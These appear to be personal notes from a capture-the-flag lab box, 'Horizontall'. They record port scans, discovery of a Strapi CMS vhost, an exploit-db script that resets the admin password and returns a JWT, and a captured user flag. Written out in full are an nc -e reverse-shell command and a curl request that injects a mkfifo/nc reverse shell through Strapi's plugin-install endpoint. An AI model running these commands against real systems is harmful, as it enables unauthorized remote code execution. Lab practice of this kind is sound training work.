10.10.11.105

# NMAP
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)

# NIKTO
- nginx 1.14.0/ubuntu

# GOBUSTER
- No directories from seclists directories 2.3 med
- Vhost mode found api-prod.horizontall.htb

# api-prod.horizontall.htb
- Strapi 3.0.0-beta.17.4
	- RCE???
	- 50239 exploitdb, appears functional
/admin
- Email enum from "forgot password" link

/users
- 403, are there auth cookies?

/reviews
- Users "wail", "john", and "doe"

/users-permissions/init
- hasAdmin=true, is this cookie?

# 50239.py
python3 50239.py http://api-prod.horizontall.htb
- admin@horizontall.htb:SuperStrongPassword1
- authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMxOTA0OTk2LCJleHAiOjE2MzQ0OTY5OTZ9.NeWyEvT4tiMqY8pCx-ICkZqYKrAvwPZYi7LAfrJR71g
- Unable to set up reverse shell with
```
nc -e /bin/sh 10.10.14.10 4444
```
- Able to log into admin panel

# Admin Panel
- File uploads - webshell/ reverse shell?


# David Uton's exploit
- Better RCE lol
user.txt:
ab29f8cb74c82505a842a778a59f0c84

https://bittherapy.net/post/strapi-framework-remote-code-execution/

Can't get this to work:
curl -i -s -k -X $'POST' -H $'Host: http://api-prod.horizontall.htb' -H $'Authorization: Bearer eyJhbGciOiJIUzI6NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMxOTA0OTk2LCJleHAiOjE2MzQ0OTY5OTZ9.NeWyEvT4tiMqY8pCx-ICkZqYKrAvwPZYi7LAfrJR71g' -H $'Content-Type: application/json' -H $'Origin: http://api-prod.horizontall.htb:80' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 4444 >/tmp/f)\",\"port\":\"80\"}' $'http://api-prod.horizontall.htb:80/admin/plugins/install'

